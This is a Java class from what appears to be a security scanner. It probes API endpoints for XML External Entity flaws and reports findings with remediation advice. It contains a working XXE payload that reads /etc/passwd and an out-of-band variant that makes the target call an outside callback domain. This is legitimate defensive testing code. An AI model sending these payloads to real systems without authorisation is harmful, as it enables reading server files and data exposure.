package ch.nexsol.orthrusdast.scanner;


import ch.nexsol.orthrusdast.http.ScanHttpClient;
import ch.nexsol.orthrusdast.model.CWEReference;
import ch.nexsol.orthrusdast.model.Operation;
import ch.nexsol.orthrusdast.model.RiskLevel;
import ch.nexsol.orthrusdast.model.Vulnerability;
import org.springframework.stereotype.Component;
import reactor.core.publisher.Flux;

import java.util.List;

/**
 * Scans for XML External Entity (XXE) vulnerabilities.
 */
@Component
public class XxeScanner implements SecurityScanner {

    private final ScanHttpClient httpClient;
    
    // Malicious DTD that attempts to read the /etc/passwd file (classic XXE)
    private static final String XXE_PAYLOAD = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>" +
            "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>" +
            "<foo>&xxe;</foo>";

    private final ch.nexsol.orthrusdast.scanner.oast.OastService oastService;

    public XxeScanner(ScanHttpClient httpClient, ch.nexsol.orthrusdast.scanner.oast.OastService oastService) {
        this.httpClient = httpClient;
        this.oastService = oastService;
    }

    @Override
    public String getId() {
        return "xxe-injection";
    }

    @Override
    public String getName() {
        return "XML External Entity Scanner";
    }

    @Override
    public Flux<Vulnerability> scan(Operation operation) {
        // Only target POST/PUT/PATCH endpoints that might accept XML
        if (!List.of("POST", "PUT", "PATCH").contains(operation.method().toUpperCase())) {
            return Flux.empty();
        }

        return oastService.createSession().flatMapMany(oastSession -> {
            String oastXxePayload = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>" +
                    "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://" + oastSession.domain() + "/xxe\"> ]>" +
                    "<foo>&xxe;</foo>";

            java.util.Map<String, String> newHeaders = new java.util.HashMap<>(operation.headers());
            newHeaders.put("Content-Type", "application/xml");

            Operation testOpPasswd = new Operation(
                    operation.url(), operation.method(), newHeaders, operation.queryParams(),
                    XXE_PAYLOAD, operation.securityRequirements(), operation.expectedContentTypes(), operation.authScheme()
            );

            Operation testOpOast = new Operation(
                    operation.url(), operation.method(), newHeaders, operation.queryParams(),
                    oastXxePayload, operation.securityRequirements(), operation.expectedContentTypes(), operation.authScheme()
            );

            Flux<Vulnerability> scanVulns = httpClient.send(testOpPasswd).flatMapMany(response -> {
                if (response.bodyContains("root:x:0:0:") || response.bodyContains("daemon:x:1:1:")) {
                    Vulnerability vuln = createVulnerabilityWithTrace(
                            "XML External Entity (XXE) Injection",
                            "The endpoint processes untrusted XML and evaluates external entities. This allowed the scanner to read local files on the server.",
                            RiskLevel.CRITICAL,
                            Vulnerability.Confidence.HIGH,
                            operation,
                            CWEReference.CWE_611,
                            List.of("CAPEC-228"),
                            9.8,
                            "The response contained the contents of /etc/passwd.",
                            "Disable external entity parsing in your XML parser configuration. For Java, configure DocumentBuilderFactory to disallow DOCTYPE declarations.", testOpPasswd, response,
                            "API Endpoint (Network)",
                            "Unauthorized Access / Data Exposure");
                    return Flux.just(vuln);
                }
                return Flux.empty();
            }).concatWith(httpClient.send(testOpOast).flatMapMany(res -> Flux.empty())); // Send OAST payload but ignore response body

            return scanVulns.concatWith(oastService.pollInteractions(oastSession).map(interaction -> 
                createVulnerabilityWithTrace(
                        "Out-Of-Band (Blind) XXE Injection",
                        "The endpoint evaluated an external entity and made an out-of-band request to the OAST server.",
                        RiskLevel.CRITICAL,
                        Vulnerability.Confidence.HIGH,
                        operation,
                        CWEReference.CWE_611,
                        List.of("CAPEC-228"),
                        9.8,
                        "An interaction was received from " + interaction.remoteAddress() + " via " + interaction.protocol(),
                        "Disable external entity parsing in your XML parser configuration.", testOpOast, null,
                        "API Endpoint (Network)",
                        "Unauthorized Access / Data Exposure")
            ));
        });
    }
}
